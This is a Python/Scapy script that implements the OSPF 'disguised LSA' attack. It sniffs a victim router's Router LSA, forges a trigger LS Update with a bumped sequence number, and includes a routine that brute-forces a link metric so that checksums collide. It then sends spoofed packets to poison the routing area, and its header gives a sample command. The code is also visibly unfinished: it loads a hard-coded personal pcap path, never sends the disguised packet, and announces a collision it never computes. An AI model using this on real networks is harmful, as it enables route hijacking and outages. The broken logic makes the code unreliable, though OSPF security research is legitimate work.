#! /usr/bin/env python

"""
This script is used to attack an OSPF router area with a disguised Router LSA message.
There are 4 arguments to pass to the script, explained in detail below.
### Victim router
This router receives a "trigger" package; this is used to trigger the fightback mechanism,
while sending the disguised package at the same time. In this way, the generated fightback
package arrives to the other router too late, and it is discarded because seen as "too old",
when compared to the disguised one. On the other hand, the victim router does not verify if
the fightback package is accepted or not and hence it does not send any new LSA, until
the current one expires (normally, on Cisco device, LSAs expire after 30 minutes).
### Neighbor router
First of all, in this case the "neighbor" is refered to the neighbor defined inside the
victim's router configuration (this is one of the neighbor of the victim router).
This router is the target of the disguised LSA package. In theory, it could be a multicast
address, but in reality this is not the case: in fact, if the neighbor router receives
both the trigger packet and the disguised packet (because both are sent to the multicast
address), the disguised one is discarted, due to the "hold timer". If you try, the router
receives:
- the trigger packet
- the disguised packet
- the fightback packet
The first is accepted, while the second and the third packets are discarted. Then, the neighbor
router sends out an LSAcknowledge to the victim router, with an ACK for the first packet. When
the victim router receives it, it sends out, once again, the fightback packet (because the LSAck
refers to the trigger packet, which has a sequence number smaller, by one, if compared to the fightback
sequence number), overwriting anything on the whole OSPF area.
### Interface
This is the network interface to use for sniffing and for sending both the trigger and the disguised
packets.
### Sample command
./ospf-disguised-lsa.py -v 172.16.22.5 -n 172.16.22.2 -i eth2
"""

import sys
import argparse

"""
Import Scapy avoiding error printing on the console.
"""
sys.stderr = None
from scapy.all import *
sys.stderr = sys.__stderr__

#####################################################
# Utils functions		 							#
#####################################################

"""
Checks if the incoming packet is an OSFP LS Update packet
sent from the victim router.
"""
def check_incoming_packet(victim, pkt):
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if OSPF_Router_LSA in lsa:
				if lsa[OSPF_Router_LSA].adrouter == victim:
					return True
	return False

"""
Returns the position of the victim router LSA taken from the originally captured packet
"""
def get_victim_lsa_index(victim_ip, pkt):
	position = 0
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if OSPF_Router_LSA in lsa:
				if lsa[OSPF_Router_LSA].adrouter == victim_ip:
					break
				position += 1
	return position

"""
This function calculates the value of the first and the second byte in the
OSPF Link "metric" field, used to fake the checksum.
"""
def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):

	tmp_lsa = evil_lsa[OSPF_Router_LSA].copy()
	fightback_checksum = ospf_lsa_checksum(fightback_lsa.build())
	# print("copy_correctcheckSum without using scapy")

	"""
	Ok guys, I have no enough time here to understand how to do it in a cool and fancy
	way with numpy. So, fuck, let's bruteforce it (using 65535 cycles, in the worst case).
	"""
	for metric in range (0,65535):
		tmp_lsa[OSPF_Router_LSA].linklist[linkcount].metric = metric
		tmp_checksum = ospf_lsa_checksum(tmp_lsa.build())

		if tmp_checksum == fightback_checksum:
			print("temp_checksum")
			print(tmp_checksum)
			print("fightback_checksum")
			print(fightback_checksum)
			return metric

	return 0

if __name__ == '__main__':

	"""
    Load the Scapy's OSPF module
    """
	load_contrib("ospf")

	"""
	Getting arguments from the command line
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victim_ip", help="[mandatory] The interface IP address of the victim router")
	parser.add_argument("-n", "--neighbor_ip", help="[mandatory] The IP to send the disguised LSA to (the neighbor of the victim router)")
	parser.add_argument("-i", "--iface", help="[mandatory] The interface to use for sniffing and sending packets")

	args = parser.parse_args()

	if 	(args.victim_ip == None or
		args.iface == None or
		args.neighbor_ip == None):
		
		parser.print_help()
		sys.exit(1)
	
	#####################################################
	# Initial configuration 							#
	#####################################################

	"""
	This is the IP address of the router we want to "spoof" (the one which receives the trigger packet).
	"""
	victim_ip = args.victim_ip

	"""
	This is the IP address of a neighbor of the victim router, to which the disguised LSA is sent.
	"""
	
	neighbor_ip = args.neighbor_ip

	"""
	This is the interface to use for both sniffing and sending packets.
	"""
	iface = args.iface

	print("[+] Staring sniffing for LSUpdate from the victim's router...")

	#####################################################
	# Sniffing for the original package					#
	#####################################################

	"""
	Sniff all the OSFP packets and stop when the first OSPF Router LSA is received.
	"""
	pkts = sniff(filter="proto ospf", iface=iface, stop_filter=lambda x: check_incoming_packet(victim_ip, x))

	"""
	Get the last packet and copy it.
	"""
	pkt_orig = pkts[-1].copy()

	#####################################################
	# Prepare the triggering packet 					#
	#####################################################

	print("[+] Preparing trigger packet...")

	"""
	We prepare an ad-hoc trigger packet, containing only one Router LSA: this is
	taken from the original package sent by the victim router.
	"""
	pkt_trig = pkts[-1].copy()
	victim_lsa_index = get_victim_lsa_index(victim_ip, pkt_orig)

	"""
	To be effective, the sequence of the LSA has to be increased by 1.
	"""
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq = 7
	
	"""
	Adjust source and destination MAC addresses...
	"""
	pkt_trig[Ether].src = None
	pkt_trig[Ether].dst = None

	"""
	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
	Moreover, we update the source and destionatio IPs, and the source IP in the OSPF
	header.
	"""

	print("[+] Preparing disguised packet...")

	"""
	Get a fresh copy of the original packet.
	"""
	a = rdpcap("/home/anoop/Desktop/disg/topo1/org_trace_after_pktTrig.pcapng")
 
	"""
	apparently the checksum calculated by the scapy is wrong thus using this method
	"""

	pkt_evil = a[9].copy()
	pkt_trig2 = a[9].copy()
	pkt_org1 = a[9].copy()


	
	print("[+] Collision found! Time to send the pkts...")
	
	"""
	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
	"""

	pkt_trig2[IP].src = "10.0.3.2"
	pkt_trig2[IP].dst = "224.0.0.5"
	pkt_trig2[IP].chksum = None
	pkt_trig2[IP].len = None
	pkt_trig2[OSPF_Hdr].chksum = None
	pkt_trig2[OSPF_Hdr].len = None
	pkt_trig2[OSPF_Router_LSA].age = 3600
	pkt_trig2[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 1
	pkt_trig2[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len = None
	pkt_trig2[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len = None
	pkt_trig2[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None



	"""
	Send original packet to trigger the fightback mechanism and the disguised LSA package.
	"""
	
	time.sleep(20)
	
	sendp(pkt_trig2, iface=iface)
	print("pkt trigger-------------->")
	print(pkt_trig2.show())

